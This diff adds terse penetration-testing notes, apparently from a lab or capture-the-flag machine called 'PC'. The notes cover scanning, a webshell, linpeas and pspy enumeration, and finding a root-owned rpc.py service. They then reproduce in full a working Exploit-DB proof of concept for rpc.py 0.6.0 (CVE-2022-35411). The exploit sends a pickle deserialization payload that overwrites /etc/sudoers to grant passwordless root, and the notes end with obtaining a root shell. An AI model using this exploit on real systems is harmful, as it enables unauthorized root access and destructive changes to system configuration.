@@ -1,0 +1,77 @@
+PC
+192.168.171.210
+nmap  192.168.171.210
+running webshell 
+
+transfer and run linpeas.sh
+
+rpc.py is running 
+confirt by using pspy
+
+
+
+
+2024/09/20 06:22:46 CMD: UID=0     PID=1044   | python3 /opt/rpc.py 
+this is vulnerable and can be exploited 
+
+https://www.exploit-db.com/exploits/50983
+
+'echo "user ALL=(root) NOPASSWD: ALL" > /etc/sudoers')
+
+There was some issue with exploit 
+
+# Exploit Title: rpc.py 0.6.0 - Remote Code Execution (RCE)
+# Google Dork: N/A
+# Date: 2022-07-12
+# Exploit Author: Elias Hohl
+# Vendor Homepage: https://github.com/abersheeran
+# Software Link: https://github.com/abersheeran/rpc.py
+# Version: v0.4.2 - v0.6.0
+# Tested on: Debian 11, Ubuntu 20.04
+# CVE : CVE-2022-35411
+
+import requests
+import pickle
+
+# Unauthenticated RCE 0-day for https://github.com/abersheeran/rpc.py
+
+HOST ="127.0.0.1:65432"
+
+URL =f"http://{HOST}/sayhi"
+
+HEADERS = {
+    "serializer": "pickle"
+}
+
+
+def generate_payload(cmd):
+
+    class PickleRce(object):
+        def __reduce__(self):
+            import os
+            return os.system, (cmd,)
+
+    payload =pickle.dumps(PickleRce())
+
+    print(payload)
+
+    return payload
+
+
+def exec_command(cmd):
+
+    payload = generate_payload(cmd)
+
+    requests.post(url=URL, data=payload, headers=HEADERS)
+
+
+def main():
+    exec_command('echo "user ALL=(root) NOPASSWD: ALL" > /etc/sudoers')
+    # exec_command('uname -a')
+
+
+if __name__ == "__main__":
+    main()
+    
+   sudo /bin/bash
+   got root shell
